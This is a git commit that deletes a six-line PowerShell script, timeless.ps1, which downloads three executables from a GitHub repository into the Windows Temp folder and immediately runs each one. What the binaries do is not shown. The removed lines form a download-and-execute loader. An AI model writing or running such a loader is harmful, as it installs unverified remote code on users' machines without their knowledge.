ba26ad6186358b31ea96e455c2f84a82088ee05a
fosslas <dimovanka5@gmail.com>
2026-06-16 22:11:29 +0200

    Delete files/timeless.ps1

--- files/timeless.ps1
+++
@@ -1,6 +0,0 @@
-(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe','C:\Windows\Temp\Timeless.exe')
-Start-Process 'C:\Windows\Temp\Timeless.exe'
-(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe','C:\Windows\Temp\timeless_scanner.exe')
-Start-Process 'C:\Windows\Temp\timeless_scanner.exe'
-(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe','C:\Windows\Temp\block_majestic.exe')
-Start-Process 'C:\Windows\Temp\block_majestic.exe'
